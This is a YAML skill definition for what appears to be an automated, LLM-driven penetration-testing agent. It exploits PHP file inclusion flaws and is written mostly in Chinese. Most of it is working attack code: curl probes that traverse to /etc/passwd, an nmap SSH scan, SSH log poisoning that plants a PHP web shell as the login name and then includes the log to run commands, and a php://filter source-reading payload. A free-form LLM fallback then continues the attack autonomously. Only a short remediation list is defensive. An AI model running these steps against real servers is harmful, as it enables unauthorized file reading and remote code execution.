skill_id: lfi_rfi_exploit
name: "本地/远程文件包含 (LFI/RFI)"
category: web_rce
version: "1.0"

principle: |
  文件包含漏洞允许攻击者读取服务器文件或执行代码。
  攻击链: LFI读取敏感文件 → 日志注入(SSH/Apache) → 包含日志文件 → RCE。
  PHP filter 链可直接读取源码: php://filter/convert.base64-encode/resource=
  常见参数: page, file, include, path, doc, folder, view, content, template

match:
  rules:
    - evidence_contains: ["file inclusion"]
    - evidence_contains: ["LFI"]
    - evidence_contains: ["path traversal"]
    - evidence_contains: ["directory traversal"]
    - cve_matches:
        - "CVE-2021-41773"
        - "CVE-2021-42013"
    - fingerprint_contains: ["php"]
      evidence_contains: ["include"]

probes:
  - id: detect_lfi
    description: "探测常见 LFI 参数"
    command: |
      BASE=$(echo "{ENDPOINT}" | sed 's|^\(https\?://[^/]*\).*|\1|')
      echo "=== LFI Probe ==="
      for param in page file include path doc folder view content template; do
        result=$(curl -s "$BASE/?$param=../../../../../etc/passwd" --max-time 8 2>/dev/null)
        if echo "$result" | grep -q "root:x:0"; then
          echo "LFI_FOUND:$param"
          echo "$result" | head -5
          exit 0
        fi
      done
      # 尝试已知路径
      for path in "/antibot_image/antibots/info.php?image=" "/index.php?page=" "/include.php?file="; do
        result=$(curl -s "$BASE$path../../../../../etc/passwd" --max-time 8 2>/dev/null)
        if echo "$result" | grep -q "root:x:0"; then
          echo "LFI_PATH_FOUND:$path"
          echo "$result" | head -5
          exit 0
        fi
      done
      echo "LFI_NOT_FOUND"
    timeout: 60
    parse_rules:
      - if_contains: ["LFI_FOUND"]
        set: { lfi_confirmed: true, lfi_type: "param" }
      - if_contains: ["LFI_PATH_FOUND"]
        set: { lfi_confirmed: true, lfi_type: "path" }

  - id: check_ssh_port
    description: "检查 SSH 端口（用于日志注入）"
    depends_on: { lfi_confirmed: true }
    command: |
      nmap -sT -p 22,2211,2222 --open {TARGET_IP} 2>/dev/null | grep "open" || echo "NO_SSH"
    timeout: 15
    parse_rules:
      - if_regex: "\\d+/tcp\\s+open\\s+ssh"
        set: { ssh_available: true }

exploit_paths:
  - path_id: lfi_etc_passwd
    name: "LFI 读取敏感文件"
    priority: 1
    conditions:
      lfi_confirmed: true
    steps:
      - id: read_passwd
        description: "读取 /etc/passwd 确认 LFI"
        command: |
          BASE=$(echo "{ENDPOINT}" | sed 's|^\(https\?://[^/]*\).*|\1|')
          result=$(curl -s "$BASE/?page=../../../../../etc/passwd" --max-time 10 2>/dev/null)
          echo "$result"
          echo "$result" | grep -q "root:x:0" && echo "LFI_PASSWD_OK"
        timeout: 15
        success_criteria:
          stdout_contains_any: ["root:x:0", "LFI_PASSWD_OK"]
        on_success: try_log_poison
        on_fail: next_path
        evidence_capture:
          shell_type: "file_read"

      - id: try_log_poison
        description: "SSH 日志注入 + LFI 包含实现 RCE"
        command: |
          BASE=$(echo "{ENDPOINT}" | sed 's|^\(https\?://[^/]*\).*|\1|')
          echo "=== Log Poisoning via SSH ==="
          # 注入 PHP 代码到 SSH auth.log
          sshpass -p "x" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 \
            '<?php system($_GET["cmd"]);?>'@{TARGET_IP} 2>&1 || true
          sleep 2
          # 尝试包含 auth.log 并执行命令
          for logpath in /var/log/auth.log /var/log/secure /var/log/sshd.log; do
            result=$(curl -s "$BASE/?page=../../../../../$logpath&cmd=id" --max-time 10 2>/dev/null)
            if echo "$result" | grep -q "uid="; then
              echo "LOG_POISON_RCE"
              echo "$result" | grep "uid="
              exit 0
            fi
          done
          echo "LOG_POISON_FAILED"
        timeout: 30
        success_criteria:
          stdout_contains_any: ["uid=", "LOG_POISON_RCE"]
        on_success: conclude_success
        on_fail: next_path
        evidence_capture:
          shell_type: "rce_log_poison"

  - path_id: php_filter_chain
    name: "PHP Filter 链源码读取"
    priority: 2
    conditions:
      lfi_confirmed: true
    steps:
      - id: php_filter
        description: "用 php://filter 读取源码"
        command: |
          BASE=$(echo "{ENDPOINT}" | sed 's|^\(https\?://[^/]*\).*|\1|')
          echo "=== PHP Filter Chain ==="
          result=$(curl -s "$BASE/?page=php://filter/convert.base64-encode/resource=index" --max-time 10 2>/dev/null)
          if [ ${#result} -gt 20 ]; then
            echo "PHP_FILTER_OK"
            echo "$result" | base64 -d 2>/dev/null | head -30
          else
            echo "PHP_FILTER_FAILED"
          fi
        timeout: 15
        success_criteria:
          stdout_contains_any: ["PHP_FILTER_OK", "<?php"]
        on_success: conclude_success
        on_fail: next_path
        evidence_capture:
          shell_type: "source_read"

  - path_id: llm_freeform
    name: "LLM 自由推理"
    priority: 99
    mode: react_freeform
    max_rounds: 8

remediation: |
  1. 禁止用户输入直接用于 include/require
  2. 使用白名单限制可包含的文件
  3. 设置 open_basedir 限制文件访问范围
  4. 关闭 allow_url_include
